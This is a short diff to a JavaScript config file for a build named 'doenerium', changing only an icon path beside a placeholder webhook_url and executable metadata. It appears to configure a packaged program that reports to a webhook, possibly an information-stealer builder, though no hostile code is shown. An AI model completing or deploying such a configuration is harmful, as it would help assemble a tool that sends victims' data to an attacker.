@@ -1,7 +1,7 @@
 module.exports = () => {
     return {
         webhook_url: "REPLACE_ME",
-        icon: './asd.ico',
+        icon: './default.ico',
         properties: {
             FileDescription: 'doenerium',
             ProductName: 'doenerium',
